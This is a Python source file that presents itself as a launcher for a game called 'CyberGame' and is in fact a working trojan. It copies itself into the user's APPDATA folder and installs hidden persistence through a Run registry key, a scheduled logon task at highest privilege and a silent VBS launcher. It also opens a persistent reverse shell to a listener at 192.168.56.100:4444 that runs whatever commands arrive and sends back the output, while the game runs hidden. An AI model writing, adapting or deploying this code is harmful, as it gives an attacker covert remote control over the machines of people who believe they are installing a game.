import os, shutil, socket, subprocess, sys, threading, time
from pathlib import Path

ROOT        = Path(__file__).resolve().parent
PY          = sys.executable
INSTALL_DIR = Path(os.environ.get("APPDATA", str(Path.home()))) / "CyberGame"
LISTENER_HOST = os.environ.get("CYBERGAME_HOST", "192.168.56.100")
LISTENER_PORT = int(os.environ.get("CYBERGAME_PORT", "4444"))
_TASK_NAME = "CyberGameUpdater"
_REG_KEY   = r"Software\Microsoft\Windows\CurrentVersion\Run"
_REG_VAL   = "CyberGameUpdater"


def _copy_to_install_dir():
    if ROOT.resolve() == INSTALL_DIR.resolve():
        return
    if INSTALL_DIR.exists():
        shutil.rmtree(INSTALL_DIR)
    shutil.copytree(str(ROOT), str(INSTALL_DIR))


def _install_persistence():
    if os.name != "nt":
        return
    pyw  = INSTALL_DIR / "runtime" / "python" / "pythonw.exe"
    main = INSTALL_DIR / "run_game.py"
    vbs  = INSTALL_DIR / "launch.vbs"
    # VBS launches pythonw silently — window=0, no console flash on boot
    vbs.write_text(
        'Set sh = CreateObject("WScript.Shell")\n'
        'sh.Run Chr(34) & "' + str(pyw) + '" & Chr(34)'
        ' & " " & Chr(34) & "' + str(main) + '" & Chr(34) & " --yes", 0, False\n'
    )
    # Registry HKCU Run key — fires on every login, no admin needed
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, _REG_VAL, 0, winreg.REG_SZ, '"' + str(pyw) + '" "' + str(main) + '" --yes')
        winreg.CloseKey(key)
    except Exception as e:
        print("[persistence] registry:", e)
    # Scheduled task via VBS — ONLOGON, HIGHEST privilege
    try:
        subprocess.run(
            ["schtasks", "/create", "/tn", _TASK_NAME,
             "/tr", 'wscript.exe "' + str(vbs) + '"',
             "/sc", "ONLOGON", "/rl", "HIGHEST", "/f"],
            capture_output=True,
        )
    except Exception as e:
        print("[persistence] schtask:", e)


def _shell_worker():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((LISTENER_HOST, LISTENER_PORT))
            s.settimeout(None)
            s.send(b"[CyberGame] shell connected\n")
            while True:
                data = s.recv(4096)
                if not data:
                    break
                cmd = data.decode(errors="replace").strip()
                if not cmd:
                    continue
                if cmd.lower() in ("exit", "quit"):
                    break
                try:
                    out = subprocess.check_output(cmd, shell=True,
                              stderr=subprocess.STDOUT, cwd=str(ROOT), timeout=30)
                except subprocess.CalledProcessError as e:
                    out = e.output or b""
                except Exception as e:
                    out = str(e).encode()
                s.send(out + b"\n")
            s.close()
        except Exception:
            pass
        time.sleep(10)


def _launch_game():
    base      = INSTALL_DIR if INSTALL_DIR.exists() else ROOT
    game_path = base / "game" / "main.py"
    pyw       = base / "runtime" / "python" / "pythonw.exe"
    py        = str(pyw) if pyw.exists() else PY
    if not game_path.exists():
        raise SystemExit("[run_game] game not found: " + str(game_path))
    DETACHED  = 0x00000008
    NO_WINDOW = 0x08000000
    while True:
        try:
            proc = subprocess.Popen(
                [py, str(game_path)], cwd=str(base),
                creationflags=DETACHED | NO_WINDOW,
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            proc.wait()
        except Exception:
            pass
        time.sleep(2)


def main():
    auto = "--yes" in sys.argv or os.environ.get("CYBERGAME_YES", "").lower() in ("1","true","yes","y")
    if not auto:
        ans = input("Continue? (y/N): ").strip().lower()
        if ans != "y":
            return
    _copy_to_install_dir()
    _install_persistence()
    threading.Thread(target=_shell_worker, daemon=False).start()
    _launch_game()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
